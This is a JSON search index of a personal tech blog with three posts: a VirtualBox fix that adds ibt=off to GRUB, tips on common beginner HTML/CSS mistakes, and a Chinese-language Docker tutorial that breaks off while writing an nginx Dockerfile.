[{"categories":["Problem Solving"],"content":"Attempt to solve the problem of VirtualBox stuck on 'Starting' when starting a virtual machine. It is said that there has been a big news recently, and this problem can be solved by setting the kernel parameter ibt=off.","date":"2023-03-06","objectID":"/posts/problem_of_virtualbox_appeding_starting_vm/","tags":["VirtualBox","Linux","KVM","Kernel","Virtual Machine","Grub","ibt=off"],"title":"Attempt to Solve the Problem of VirtualBox Stuck on 'Starting' When Starting a Virtual Machine","uri":"/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["Problem Solving"],"content":"Prologue: What was the problem? Today, I felt like playing around with VirtualBox and discovered that every virtual machine was stuck at Starting virtual machine.. The first step when encountering a problem is to go to Google. Hmm… I found two posts on the official Arch forum. Virtualbox hangs on Starting virtual machine window / Newbie Corner / Arch Linux Forums KVM busted in linux 5.18 due to Intel CET / Kernel \u0026 Hardware / Arch Linux Forums After reading the two posts, I discovered that it was due to a bug in KVM in the new version of the kernel. Fortunately, a skilled individual had already submitted a bug report. FS#75481 : [linux] VBox virtual machines stop functioning x86/ibt: Add IBT feature, MSR and #CP handling · torvalds/linux@991625f · GitHub As for how this bug came about… I’m not sure, I’m not that knowledgeable. Thinking about how to solve it Based on the content of the posts I’ve read, the solution is to set the kernel parameter ibt=off. Thank you appending ibt=off to kernel boot params fixed my problem. ","date":"2023-03-06","objectID":"/posts/problem_of_virtualbox_appeding_starting_vm/:0:0","tags":["VirtualBox","Linux","KVM","Kernel","Virtual Machine","Grub","ibt=off"],"title":"Attempt to Solve the Problem of VirtualBox Stuck on 'Starting' When Starting a Virtual Machine","uri":"/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["Problem Solving"],"content":"How do I set kernel boot parameters? Since I didn’t know how to do this, I went to Google and found a method. How to set kernel boot parameters on Linux - Linux Tutorials - Learn Linux Configuration ","date":"2023-03-06","objectID":"/posts/problem_of_virtualbox_appeding_starting_vm/:1:0","tags":["VirtualBox","Linux","KVM","Kernel","Virtual Machine","Grub","ibt=off"],"title":"Attempt to Solve the Problem of VirtualBox Stuck on 'Starting' When Starting a Virtual Machine","uri":"/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["Problem Solving"],"content":"Proposed Solution Actually, the solution is to edit the value of GRUB_CMDLINE_LINUX=\"\" in the /etc/default/grub file and add “ibt=off” to it. Solution Steps ","date":"2023-03-06","objectID":"/posts/problem_of_virtualbox_appeding_starting_vm/:2:0","tags":["VirtualBox","Linux","KVM","Kernel","Virtual Machine","Grub","ibt=off"],"title":"Attempt to Solve the Problem of VirtualBox Stuck on 'Starting' When Starting a Virtual Machine","uri":"/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["Problem Solving"],"content":"1. Edit the /etc/default/grub file The purpose of editing this file is to set the kernel boot parameters. The method for setting this may vary depending on the system booted by different bootloaders. As I am using Grub in my Arch system, I need to edit this file. $ sudo vim /etc/default/grub Find the keyword GRUB_CMDLINE_LINUX=\"\" and add the parameter ibt=off. # GRUB boot loader configuration GRUB_DEFAULT=0 GRUB_TIMEOUT=5 GRUB_DISTRIBUTOR=\"Arch\" GRUB_CMDLINE_LINUX_DEFAULT=\"loglevel=7\" GRUB_CMDLINE_LINUX=\"ibt=off\" ...... Enter : and type wq to save and exit the file (this is a basic operation and requires no further explanation). ","date":"2023-03-06","objectID":"/posts/problem_of_virtualbox_appeding_starting_vm/:3:0","tags":["VirtualBox","Linux","KVM","Kernel","Virtual Machine","Grub","ibt=off"],"title":"Attempt to Solve the Problem of VirtualBox Stuck on 'Starting' When Starting a Virtual Machine","uri":"/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["Problem Solving"],"content":"2. Regenerate the Grub configuration file Then, regenerate the Grub configuration file. $ sudo grub-mkconfig -o /boot/grub/grub.cfg Wait for the operation to complete. If there are no errors, you can restart the operating system. $ sudo reboot Testing and Verification After restarting the system, open VirtualBox again and start a virtual machine. At this point, it should successfully enter the system. This means that the problem has been solved. ","date":"2023-03-06","objectID":"/posts/problem_of_virtualbox_appeding_starting_vm/:4:0","tags":["VirtualBox","Linux","KVM","Kernel","Virtual Machine","Grub","ibt=off"],"title":"Attempt to Solve the Problem of VirtualBox Stuck on 'Starting' When Starting a Virtual Machine","uri":"/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["Web"],"content":"Introduction Many beginners often encounter some basic problems when learning HTML and CSS, which can be frustrating. I originally didn’t want to write about basic topics, but I feel that some people may need to see this kind of content…so here are some tips. There is not much to say, just some issues related to syntax and usage. Common Issues I Have Noticed ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:0:0","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"HTML Syntax Problems ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:1:0","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"Tag Order Problems I often get asked questions like “Why isn’t my content showing up when I put the tags in?”, or “Why isn’t this working…” and so on. The first question I was asked was why the content of the title (\u003ch1\u003e tag) wasn’t showing up. I took a look at their code: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003ctitle\u003eTest\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cp\u003e ppp \u003ch1\u003eTT\u003c/h1\u003e pppp \u003c/p\u003e \u003c/body\u003e \u003c/html\u003e I couldn’t believe it – they put the \u003ch1\u003e tag inside the \u003cp\u003e tag… It’s clear that they aren’t familiar with either of these tags. Both \u003ch1\u003e and \u003cp\u003e are block-level elements, and by default the font size of \u003ch1\u003e is larger than that of \u003cp\u003e. Therefore, putting them together may result in display errors. Normally, these two tags exist on the same level, and both will occupy a line to display. If the larger \u003ch1\u003e tag is nested inside the smaller one, of course you won’t be able to see it~ In summary, there cannot be headings within paragraphs, and they cannot be nested within each other. Therefore, the correct way to write it should be as follows: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003ctitle\u003eTest\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eThe Title Of An article.\u003c/h1\u003e \u003cp\u003eThe Paragraph.\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:1:1","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"Missing Symbols Sometimes I get asked about this issue as well, and I feel like these are all basic errors. Looking at the code, I’m like, “What is this mess?\" It’s clearly not standard HTML. \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" \u003e \u003ctitle\u003eTest\u003c/title \u003c/head\u003e \u003cbody\u003e \u003cdiv\u003e \u003ch1\u003eTest\u003c/h1 \u003cp Text\u003c/p\u003e \u003cdiv\u003e /body\u003e \u003c/html\u003e This type of code… Either they weren’t paying attention when writing it or they’re not familiar with how to use these tags. Or perhaps they don’t know how to represent tags. Let me explain again: there are two types of tags, single tags and double tags. Taking the tag for inserting an image as an example, the single tag looks like this: \u003cimg /\u003e. The \u003c at the beginning and \u003e at the end can’t be left out, and it’s best to add a / before the closing \u003e. As for double tags, let’s take the paragraph tag as an example: \u003cp\u003eThis is a paragraph.\u003c/p\u003e. This type of double tag must have an opening and closing tag. Neither the beginning nor the end can be left out. When writing double tags and there’s nesting involved, it’s a good habit to indent each level on a new line. \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003ctitle\u003eTest\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"Box1\"\u003e \u003cdiv class=\"Box2\"\u003e \u003ch1\u003eTitle\u003c/h1\u003e \u003cul\u003e \u003cli\u003e \u003cp\u003ePara1\u003c/p\u003e \u003c/li\u003e \u003cli\u003e \u003cp\u003ePara2\u003c/p\u003e \u003c/li\u003e \u003c/ul\u003e \u003c/div\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e This way, the code is not only beautiful, but it’s also easier to maintain and troubleshoot in the future. ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:1:2","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"Not Differentiating Between \u003chead\u003e and \u003cbody\u003e In addition to the aforementioned issues, there are even cases where people write \u003cdiv\u003e tags inside the \u003chead\u003e, which indicates that they haven’t yet distinguished between the HTML header and content display areas. I can only explain it this way: The \u003chead\u003e section is the header information area, which is what the server sends to the browser. The code inside it is not rendered on the page in the browser. The \u003cbody\u003e section is the content display area, used to write tags that can be displayed. You can also write \u003cscript\u003e tags with JavaScript code nested inside, but CSS styles cannot be written here. ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:1:3","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"CSS Problems In addition to syntax issues and not differentiating between sections in HTML, there are also some strange questions people ask me when writing CSS. ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:2:0","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"Referencing Stylesheets There are three ways to reference CSS stylesheets, according to textbooks, but the most commonly used are two. My personal favorite is to use \u003clink\u003e to link the stylesheet. This way, you can split it into two files and write them side by side, making it very convenient. You don’t need to flip back and forth like with inline styles. As for inline styles? They’re not used much, I almost never use them in practice. But there are still people who don’t know how to link stylesheets? The main issue is not understanding the concept of paths. It’s actually very simple – just remember the relative path and then fill it into the href attribute value of the \u003clink\u003e tag. \u003clink type=\"text/css\" rel=\"stylesheet\" href=\"css/style.css\" /\u003e Of course, there are still people who don’t know how to use inline styles, but there’s not much to say about it. Just remember that the \u003cstyle\u003e tag must be placed inside the \u003chead\u003e section and then write the styles using the correct CSS format inside the \u003cstyle\u003e tag. For example： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cstyle type=\"text/css\"\u003e *{ margin: 0; padding: 0; } .TopHead{ background-color: white; border: solid 1px black; width: 100px; height: 200px; } \u003c/style\u003e \u003cbody\u003e \u003cdiv class=\"TopHead\"\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:2:1","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"When writing CSS, losing ;, {, and } and misspelling words. These are all minor mistakes that can be improved with more practice and attention. The correct template should look like this: Selector { Property: value; } .TopHead{ background-color: white; border: solid 1px black; width: 100px; height: 200px; } ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:2:2","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"Remove default padding and margin Many beginners do not develop the habit of resetting default padding and margin in CSS when they start coding, which leads to difficulty in styling as they progress. In fact, it’s quite simple: *{ margin: 0; padding: 0; } * is a regular wildcard character in CSS, and it has the lowest priority among all selectors. Setting its margin and padding properties to 0 before everything else can eliminate the default padding and margin for all elements before they are selected by a specific selector. This makes it much easier to make more accurate adjustments to element spacing later on. If you’re still not sure whether or not to include it, try it out and see the difference for yourself. ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:2:3","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"Inappropriate naming when using class selectors and ID selectors This is also a big problem that greatly affects the readability and maintainability of the code. I often see something like this: .a1{ } .a2{ } #b1{ } #b2{ } It’s hard to know what element it actually selects, which increases workload… Because at first glance, it’s unclear what it refers to. Also, using Chinese characters for naming, although I used to like to do this when I was in middle school, this habit is not good because if there are some server encoding issues, the style files may not be loaded properly. h1.中央标题 { text-align:center; font-size:22px; } h1.一级标题 { font-size:22px; } h2.二级标题 { font-size:20px; } h2.三级标题 { font-size:18px; } h2.四级标题 { font-size:16px; } p.普通文字 { text-indent:25px; font-size:15px; text-align:justify; } But some people even use numbers! And then they ask me why the style is not displaying properly! .1{ color: red; } Numbers or names that start with numbers cannot be used as class selector names and IDs in CSS. Similarly, in many programming languages, it is not allowed to name variables using numbers or names that begin with numbers. To avoid this problem, naming conventions such as camelCase and _ concatenation can be used. Upper camel case refers to two words combined, with the first letter of each word capitalized, such as TopHead. Lower camel case refers to two words combined, with only the first letter of the second word capitalized, such as contentPlace. For naming conventions with more than two words, the _ character is needed to combine them, such as the_menu_bar. .TopHead{ width: 1000px; height: 300px; } .contentPlace{ width: 1000px; height: auto; } .the_menu_bar{ width: 100%; height: 50px; background-color: blue; } This significantly improves readability so that one can generally tell at a glance which element corresponds to which, without having to spend time searching through the code. End The above are just my personal opinions and methods for addressing some of the small issues that beginner learners may encounter when studying HTML and CSS. There may be other problems that I haven’t discovered yet… Feel free to leave a comment below to share your thoughts and feedback. ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:2:4","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["运维"],"content":"迟早要学的 Docker ， 先尝试一下吧","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"序 嗯，未雨绸缪，提前学一下怎么玩 docker 。 卷死他们 docker 是什么？ 官方英文简介 Docker is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly. With Docker, you can manage your infrastructure in the same ways you manage your applications. By taking advantage of Docker’s methodologies for shipping, testing, and deploying code quickly, you can significantly reduce the delay between writing code and running it in production. 根据官方文档的说明和通俗的理解， docker 能够提供快速部署软件项目的容器，它相当于一个可以模拟项目所需环境的虚拟机，但又和我们理解的一般的虚拟机又不同。 一般的虚拟机需要安装整个操作系统，会对我们的计算机占用大量的资源，而 docker 只需要模拟出项目所需要的运行环境，占用率非常低，这可以大大提高开发效率。 它可以按照我们的需求模拟出软件环境，并且能够快速部署我们开发好的项目实例（比如 Mastodon），并且一定程度上它具有环境隔离功能，运行环境与操作系统相分离，而且可以同时运行多个容器。 并且我们可以把容器封装成镜像，进行反复利用。 就像这条运着集装箱的鲸鱼一样，游到哪都是开箱即用。 怎么安装 docker 各个平台装 docker 都非常简单。 Linux 平台可能对初学者稍微难一些，但是对熟悉的用户来说， Linux 安装 docker 非常快。 直接从相应发行版的包管理器安装就行。 ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:0:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"Arch 比如咱 Arch 可以让 pacman 把这条鲸鱼给带回来。 sudo pacman -S docker 注意 如果运行时出现以下报错 docker: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?. See 'docker run --help'. 请使用 systemctl 启动 docker 的系统进程。 sudo systemctl start docker 如果有必要，设置其开机自启 sudo systemctl enable docker ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:1:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"Debian 如果是用 deb 系的发行版，可以参考官方文档用 apt 来安装。 ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:2:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"设置仓库 更新 apt 仓库，并安装一些依赖来允许 apt 通过 https 使用第三方仓库。 sudo apt update sudo apt install ca-certificates curl gnupg lsb-release 添加 Docker 官方 GPG 密钥 sudo mkdir -p /etc/apt/keyrings curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg 设置 Docker 仓库 echo \\ \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian \\ $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list \u003e /dev/null ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:2:1","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"安装 docker 更新软件包仓库 sudo apt update 如果更新的时候发生了 GPG 错误，可以参考官网的这个提示： Receiving a GPG error when running apt-get update? Your default umask may be incorrectly configured, preventing detection of the repository public key file. Try granting read permission for the Docker public key file before updating the package index: $ sudo chmod a+r /etc/apt/keyrings/docker.gpg $ sudo apt-get update 安装 Docker Engine 、 containerd 和 Docker Compose. sudo apt install docker-ce docker-ce-cli containerd.io docker-compose-plugin 通过运行 hello-world 镜像来验证 docker 是否安装成功 sudo docker run hello-world ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:2:2","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"rpm 系列 其实说实话，这类发行版我个人不太喜欢，就拿 CentOS 为例吧，CentOS 7 以上的版本也是可以直接用 yum 安装的。 ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:3:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"设置仓库 一样是设置第三方仓库。 不过要先安装 yum-utils 才能用 yum-config-manager。 sudo yum install -y yum-utils 然后设置仓库 sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:3:1","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"安装 一样是使用 yum 命令来安装 docker 的软件包和依赖。 sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:3:2","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"对于 Linux 平台再提一嘴 上述的方法都是在 Linux 平台安装 docker 的最新版本，如果需要安装特定的版本，可以参考 docker 的官方文档进行操作。 ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:4:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"Windows 在 Windows 平台可以直接安装 docker-desktop，这也非常简单，直接通过 docker 官方文档下载安装包就行了。 我能怎么玩 docker？ docker 能干的事多着呢。 最常用的就是在 docker 容器里运行应用程序了。 ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:5:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"HelloWorld 比如我们来运行一个 Hello World sudo docker run ubuntu /bin/echo \"hello world\" 如图所见，它输出一系列字符后，在最后输出了 hello world 那么来解释一下命令的含义吧 docker – 运行 docker 的二进制文件, 这个没什么好说的 run – 运行容器 ubuntu – 要运行的镜像名称 /bin/echo \"hello world\" - 在容器里面要执行的命令 提示 如果出现了以下信息，可能是因为在启动容器的时候没有下载好相关的镜像 Unable to find image 'ubuntu:latest' locally latest: Pulling from library/ubuntu e96e057aae67: Pull complete 默认情况下 docker 会自动下载，但最好养成启动之前下载好镜像的习惯。 sudo docker pull ubuntu ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:6:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"交互式容器 当然,我们也可以创建一个可以交互的容器,意思就是可以用 bash 来控制它 sudo docker run -i -t ubuntu /bin/bash 参数含义 -i: 交互式操作。 -t: 终端。 引自菜鸟教程 这样我们创建容器之后,我们的 shell 也变成了容器里的 shell 我们可以对它进行一些操作命令,随便打几个吧. 而且我们执行的命令是不会影响到主系统的 然后我们可以使用 exit 命令来退出这个系统. 这样一来容器的操作系统就退出了,同时容器也停止运行了, 因为这个容器不是以 daemon 模式来运行的. ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:7:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"以 daemon 模式来运行容器 接下来我要说的是,为啥上文中用 exit 退出容器 shell 之后还不算完. 这次我们再打开一个容器,不过这次加一个参数 -d 这个参数的意思是以 Daemon 模式运行, 那么 Daemon 是什么意思呢? 通过搜索引擎得到的答案往往是什么 系统守护进程巴拉巴拉的,其实它类似于后台运行的意思. 接下来我们用这个命令来开个容器 sudo docker run -i -t -d ubuntu /bin/bash 这时我们发现,我们并没有得一个 shell, 而是得到来一串字符串. 我们试试用 docker 的 ps 命令来查看一下正在运行的容器: sudo docker ps 我们得到来这样的结果 图片可能不太清楚? 这里还是贴出来吧 [weepingdogel@WeepingDogel-Arch ~]$ sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 2f4976200305 ubuntu \"/bin/bash\" About a minute ago Up About a minute funny_pare 然后发现了返回的结果中容器 ID 只有上面返回字符串的前面一部分,这个往往是我们会用的容器 ID 要怎样才能控制它的 shell 呢? 又要接触新的 docker 命令了 attach exec exec 需要加上 -i 和 -t 参数以及命令,比如 /bin/bash . 所以执行格式是这样的 sudo docker exec -it 容器ID 命令 然后我们需要执行 bash sudo docker exec -it 2f4976200305 /bin/bash 很快,我们就进入了容器的 shell. 我们可以用 cat /etc/os-release 来查看系统信息. 我们可以很清晰的看到,上面返回的是 Ubuntu 而我用的是 Arch, 因此我们可以确定容器里的东西不会影响到操作系统. 什么?不清晰?那再看清楚一点吧 PRETTY_NAME=\"Ubuntu 22.04.1 LTS\" NAME=\"Ubuntu\" VERSION_ID=\"22.04\" VERSION=\"22.04.1 LTS (Jammy Jellyfish)\" VERSION_CODENAME=jammy ID=ubuntu ID_LIKE=debian HOME_URL=\"https://www.ubuntu.com/\" SUPPORT_URL=\"https://help.ubuntu.com/\" BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\" PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\" UBUNTU_CODENAME=jammy 退出还是一样的可以用 exit , 但是此时的 exit 只是退出这个 bash, 它并不会关闭容器. 执行 docker ps 我们可以看到它还在运行. 那么我们接下来试试 attach 它的用法是 sudo docker attach 容器ID 所以我需要执行 sudo docker attach 2f4976200305 这样一来我们也可以得到一个shell,但是如果我们执行了 exit, 这个容器是会被停止的. 来试试看? 很明显,当 exit 被执行之后用 docker ps 命令看不到正在运行的容器ID,这说明容器被停止了. 如果需要再次启动这个容器呢,我们可以使用 start 或者 restart 命令来重启. sudo docker restart 2f4976200305 此时我们用 docker ps 就又能看到它在运行了 提示 使用 docker ps -a命令可以查看所有的容器,无论是否正在运行 sudo docker ps -a ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:8:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"删除容器 如果这些容器不需要了怎么办, 比如玩坏了,要把它删掉 那就要用 docker rm 命令 sudo docker rm 容器ID 后面接上容器 ID 就能删除, 可以删除多个 sudo docker rm 6c8c8d9f5540 6c49bc1fdc49 eb71e810ee50 5a84d067d769 2addaf3666ef 然后在用 docker ps -a 来查看, 就看不到任何容器 ID 了 ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:9:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"镜像 docker 容器运行的前提条件是它需要相应的镜像. 可以用 docker images 来查看本地已经有的镜像, 如果需要的别的镜像可以用 docker pull 来获取 sudo docker images 我们来获取 php 的镜像 sudo docker pull php 等待他们自动下载完成,镜像就可以用了. 如果你运行容器的时候没有事先拉取镜像的话, docker 则会在运行容器的时候临时进行拉取. 下载进程完成之后, 我们查看一下现有的镜像 sudo docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest a8780b506fa4 7 days ago 77.8MB php latest 30e567f030d3 12 days ago 484MB httpd latest fe8735c23ec5 2 weeks ago 145MB 各个选项说明: REPOSITORY：表示镜像的仓库源 TAG：镜像的标签 IMAGE ID：镜像ID CREATED：镜像创建时间 SIZE：镜像大小 同一仓库源可以有多个 TAG，代表这个仓库源的不同个版本，如 ubuntu 仓库源里，有 15.10、14.04 等多个不同的版本，我们使用 REPOSITORY:TAG 来定义不同的镜像。 引自菜鸟教程 ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:10:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"删除镜像 当然, 不需要的镜像也是可以删除的. sudo docker rmi 镜像ID 如图,这样就把不需要的镜像删除了 ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:11:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"dockerfile 啥是 dockerfile? Dockerfile 是用来构建镜像文件的文本文件, 文件里面包含的是一条条指令和说明, 和一些 shell 脚本类似(比如 PKGBUILD ) 而一个简单的 Dockerfile 是长这样的 FROM nginx RUN echo 'Hello World!' \u003e /usr/share/nginx/html/index.html 来自菜鸟教程的提示 FROM 定制的镜像都是基于 FROM 的镜像, 这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。 RUN 用于执行后面跟着的命令行命令。有以下俩种格式： shell 格式： RUN \u003c命令行命令\u003e # \u003c命令行命令\u003e 等同于，在终端操作的 shell 命令。 exec 格式: RUN [\"可执行文件\", \"参数1\", \"参数2\"] # 例如： # RUN [\"./test.php\", \"dev\", \"offline\"] 等价于 RUN ./test.php dev offline 熟悉 Linux 操作的话, 上手这玩意也就很简单了, 但是值得注意的是菜鸟教程当中说的这一段: 注意 Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大。例如： FROM centos RUN yum -y install wget RUN wget -O redis.tar.gz \"http://download.redis.io/releases/redis-5.0.3.tar.gz\" RUN tar -xvf redis.tar.gz 以上执行会创建 3 层镜像。可简化为以下格式： FROM centos RUN yum -y install wget \\ \u0026\u0026 wget -O redis.tar.gz \"http://download.redis.io/releases/redis-5.0.3.tar.gz\" \\ \u0026\u0026 tar -xvf redis.tar.gz 也就是说我们要尽量在 RUN 当中写命令脚本的时候尽量写并列语句. ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:12:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"一个简单的 Web 服务器. 现在我想试试用 docker 来跑一个简单的网页了. 就跑一下我之前闲着没事干写的登录页面吧. 首先我们要创建一个目录 mkdir webtest 先把前端的静态文件复制进去 cp test/* webtest/ -rv 然后进入该目录 cd webtest 检查一下文件 ls -lh 总计 4.0K drwxr-xr-x 2 weepingdogel weepingdogel 23 11月10日 21:30 css drwxr-xr-x 2 weepingdogel weepingdogel 6 11月10日 21:30 img -rw-r--r-- 1 weepingdogel weepingdogel 1.4K 11月10日 21:30 index.html drwxr-xr-x 2 weepingdogel weepingdogel 21 11月10日 21:30 js ok ,现在我们来写一个 dockerfile FROM nginx COPY ./index.html /usr/share/nginx/html/index.html COPY ./css/style.css /usr/share/nginx/html/css/style.css COPY ./js/main.js /usr/share/nginx/html/js/main.js 指令详解 